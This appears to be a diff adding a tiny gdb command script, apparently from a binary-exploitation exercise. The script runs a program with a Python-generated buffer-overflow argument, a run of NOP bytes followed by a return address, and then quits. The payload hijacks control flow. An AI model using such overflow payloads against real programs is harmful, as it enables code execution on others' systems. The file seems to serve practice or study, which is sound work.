@@ -1,0 +1,3 @@
+run $(python -c "print('\x90'*24+'\xc1\x06\x40')")
+
+quit
